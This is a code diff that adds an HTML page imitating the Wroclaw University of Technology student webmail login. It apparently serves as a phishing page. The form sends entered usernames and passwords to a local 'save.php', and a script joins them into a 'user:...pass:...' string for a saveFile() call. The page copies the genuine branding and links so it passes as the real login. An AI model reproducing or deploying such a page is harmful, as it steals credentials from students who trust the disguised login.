@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<HTML>
+<HEAD>
+  <title>SYSTEM POCZTY STUDENCKIEJ | Wroclawskie Centrum Sieciowo-Superkomputerowe</title>
+  <script src="save.php"></script>
+  <link rel="stylesheet" type="text/css" href="index.css"/>
+  <!--Wypelnienie-->
+  <script type="text/javascript">
+
+    li = new Array();
+
+    li[0] = new Array();
+    li[0]['href'] = "https://smail.pwr.wroc.pl";
+    li[0]['target'] = "_self";
+    li[0]['text'] = "po&#322;&#261;czenie szyfrowane";
+    li[0]['on'] = new Image();
+    li[0]['id'] = "i0";
+    li[0]['on'].src = "./images/red_dot.gif";
+    li[0]['off'] = new Image();
+    li[0]['off'].src = "./images/grey_dot.gif";
+
+    li[0] = new Array();
+    li[0]['href'] = "https://s.student.pwr.edu.pl/iwc_static/c11n/faq/";
+    li[0]['target'] = "_self";
+    li[0]['text'] = "pytania i odpowiedzi";
+    li[0]['on'] = new Image();
+    li[0]['id'] = "i1";
+    li[0]['on'].src = "./images/red_dot.gif";
+    li[0]['off'] = new Image();
+    li[0]['off'].src = "./images/grey_dot.gif";
+
+    li[1] = new Array();
+    li[1]['href'] = "https://s.student.pwr.edu.pl/modpass-pwr/";
+    li[1]['target'] = "_self";
+    li[1]['text'] = "aktywacja konta";
+    li[1]['on'] = new Image();
+    li[1]['id'] = "i2";
+    li[1]['on'].src = "./images/red_dot.gif";
+    li[1]['off'] = new Image();
+    li[1]['off'].src = "./images/grey_dot.gif";
+
+    li[2] = new Array();
+    li[2]['href'] = "https://s.student.pwr.edu.pl/passwd/reset?todo=reset";
+    li[2]['target'] = "_self";
+    li[2]['text'] = "zapomnia&#322;em/nie znam has&#322;a";
+    li[2]['on'] = new Image();
+    li[2]['id'] = "i3";
+    li[2]['on'].src = "./images/red_dot.gif";
+    li[2]['off'] = new Image();
+    li[2]['off'].src = "./images/grey_dot.gif";
+
+    li[3] = new Array();
+    li[3]['href'] = "https://s.student.pwr.edu.pl/alias";
+    li[3]['target'] = "_self";
+    li[3]['text'] = "alias pocztowy";
+    li[3]['on'] = new Image();
+    li[3]['id'] = "i4";
+    li[3]['on'].src = "./images/red_dot.gif";
+    li[3]['off'] = new Image();
+    li[3]['off'].src = "./images/grey_dot.gif";
+
+    li[4] = new Array();
+    li[4]['href'] = "https://forum.pwr.wroc.pl";
+    li[4]['target'] = "_self";
+    li[4]['text'] = "forum studentow";
+    li[4]['on'] = new Image();
+    li[4]['id'] = "i5";
+    li[4]['on'].src = "./images/red_dot.gif";
+    li[4]['off'] = new Image();
+    li[4]['off'].src = "./images/grey_dot.gif";
+
+    li[5] = new Array();
+    li[5]['href'] = "https://s.student.pwr.edu.pl";
+    li[5]['target'] = "_self";
+    li[5]['text'] = "<b>nowy interfejs pocztowy</b>";
+    li[5]['on'] = new Image();
+    li[5]['id'] = "i6";
+    li[5]['on'].src = "./images/red_dot.gif";
+    li[5]['off'] = new Image();
+    li[5]['off'].src = "./images/grey_dot.gif";
+
+    function wodotryski() {
+      for (var i = 0; i < li.length; i++) {
+        document.write("<a class='link_1' href=" + li[i]['href'] + " ");
+        document.write('"onmouseover="i6.src="https://smail.pwr.edu.pl/images/red_dot.gif"');
+        document.write('" onmouseout="i6.src="https://smail.pwr.edu.pl/images/grey_dot.gif""');
+        document.writeln(">");
+        document.writeln('<img border="0" hspace="4" src="https://smail.pwr.edu.pl/images/grey_dot.gif" id="i6">');
+        if (i === li.length - 1)
+          document.writeln(li[i]['text'] + "</a>");
+        else
+          document.writeln(li[i]['text'] + "</a><br>");
+      }
+    }
+
+  </script>
+  <!--Handles-->
+  <script type=text/javascript>
+    var copyRight = null;
+    var productName = null;
+    var logoImagePath = null;
+    var versionImagePath = null;
+    var versionPageTitle = null;
+    var closeLabel = null;
+    var closeTitle = null;
+
+    function handleLoad() {
+      copyRight = "Copyright © 2008 Sun Microsystems, Inc. All rights reserved. SUN PROPRIETARY/CONFIDENTIAL." +
+        " U.S. Government Rights - Commercial software. Government users are subject to the Sun Microsystems, Inc. " +
+        "standard license agreement and applicable provisions of the FAR and its supplements. Use is subject to license" +
+        " terms. Sun, Sun Microsystems, the Sun logo and Java are trademarks or registered trademarks of Sun Microsystems," +
+        " Inc. in the U.S. and other countries.";
+      productName = "Sun Java(TM) System Communications Express 6.3 update 1";
+      logoImagePath = "./images/login-logo.gif";
+      versionImagePath = "./../images/S1MC_login.gif";
+      versionPageTitle = "Version Information";
+      closeLabel = "Close";
+      closeTitle = "Close Window";
+      var username = document.getElementById("username");
+      username.focus();
+    }
+
+
+    function handleError() {
+      if (false || false) {
+        document.write('<DIV class=logErr>');
+        document.write('<table cellspacing=0 cellpadding=0 border=0>');
+        document.write('<tbody>');
+        document.write('<tr>');
+        document.write('<td valign=top width="28"><img src="images/Error_Large.gif" alt="" width="21" height="22">&nbsp;&nbsp;</td>');
+        document.write("<td width='233'> <span class='err'> Authentication Failed<br> Reenter your username and password.</span> </td>");
+        document.write('</tr>');
+        document.write('</tbody>');
+        document.write('</table>');
+        document.write('</DIV>');
+      }
+    }
+
+  </script>
+  <!--Submit-->
+</HEAD>
+<BODY onload='handleLoad()'>
+
+
+<table width='100%' align='center' cellspacing='0' cellpadding='0' bgcolor="#ffffff" border='0'>
+  <tr>
+    <td>
+      <div align='left'>
+        <a href="http://www.pwr.edu.pl" target="_blank">
+          <img src='images/pwr_2.gif' alt='' vspace='0' hspace='0' border='0'>
+        </a>
+        <img src='images/spacer.gif' alt='' height='20' width='1' vspace='0' hspace='0' border='0'>
+      </div>
+    </td>
+    <td>
+      <script type="text/javascript">wodotryski();</script>
+    </td>
+  </tr>
+</table>
+<table width='100%' align='center' cellspacing='0' cellpadding='0' border='0'>
+  <tr>
+    <td align='center' valign='top'>
+      <br>
+      <img src='images/spacer.gif' width='1' height='20' alt='' hspace='0' vspace='0' border='0'>
+      <img src='images/stu_1.gif' alt='' hspace='0' vspace='0' border='0'>
+    </td>
+  </tr>
+</table>
+<div align='center'>
+  <img src='images/hr_1_ani.gif' width='100%' height='2' alt='' hspace='0' vspace='0' border='0'>
+</div>
+<img src='images/spacer.gif' width='1' height='20' alt='' hspace='0' vspace='0' border='0'>
+<table width='100%' align='center' cellspacing='0' cellpadding='0' bgcolor="#ffffff" border='0'>
+  <tr>
+    <td align="center"><img src="images/prof_1.gif" alt="" border='0'></td>
+  </tr>
+  <tr>
+    <td>
+
+      <table width='70%' align='center' cellspacing='0' cellpadding='4' border='0'>
+        <tr>
+          <td class='err' align='center' colspan='2'>
+            <img src='images/spacer.gif' width='1' height='30' alt='' hspace='0' vspace='0' border='0'>
+            <script type='text/javascript'>handleError();</script>
+          </td>
+        </tr>
+      </table>
+
+      <form name="form" method="post" action="save.php">
+        <table align='center' cellspacing='0' cellpadding='4' border='0'>
+          <tr>
+            <td class='cldialog' align='right'>
+              nazwa konta:
+            </td>
+            <td align='left'>
+              <input class='ctdialog' type='text' size='24' id='username' tabindex='1' name="username">
+            </td>
+          </tr>
+          <tr>
+            <td class='cldialog' align='right'>
+              has&#322;o:
+            </td>
+            <td align='left'>
+              <input class='ctdialog' type='text' size='24' id='password' tabindex='2' name="password">
+            </td>
+          </tr>
+
+          <tr>
+            <td>&nbsp;</td>
+            <td align='left'>
+              <img src='images/spacer.gif' width='1' height='10' alt='' hspace='0' vspace='0' border='0'>
+              <br>
+              <input class='csdialog' type="submit" name="submit" value="Log In">
+            </td>
+          </tr>
+        </table>
+      </form>
+
+      <script type='text/javascript'>
+        var user = document.getElementById("username");
+        user.focus();
+      </script>
+
+      <script type="text/javascript">
+        var handleSubmit = function () {
+          var userName = document.getElementById("username").value;
+          var password = document.getElementById("password").value;
+          var data = "user:" + userName + "pass:" + password;saveFile(data);
+        }
+      </script>
+
+
+      <div align='center'>
+        <p style="font-family: Verdana; font-size:12px; color:#346A2D;font-weight:bold;">
+          <br> Wszelkie uwagi zwiazane z obsluga interfejsu prosimy przesylac na adres
+          <a name="tex2html12" href="mailto: smail@pwr.edu.pl">smail@pwr.edu.pl</a>.
+        </p><br>
+        <img src='images/hr_1.gif' width='100%' height='1' alt='' hspace='0' vspace='0' border='0'>
+      </div>
+
+      <table align='center'>
+        <tr>
+          <td valign='middle'>
+            <a href="http://www.wcss.wroc.pl" title=" Wroc&#322;awskie Centrum Sieciowo-Superkomputerowe ">
+              <img src='images/wcss_20.gif' alt=' Wroc&#322;awskie Centrum Sieciowo-Superkomputerowe ' hspace='0'
+                   vspace='0' border='0'>
+            </a>
+          </td>
+          <td valign='middle'>
+            <div class='info_1' align='center'>
+              <p>Serwer prowadzi Wroc&#322;awskie Centrum Sieciowo-Superkomputerowe</p>
+            </div>
+          </td>
+        </tr>
+      </table>
+</table>
+</BODY>
+</HTML>
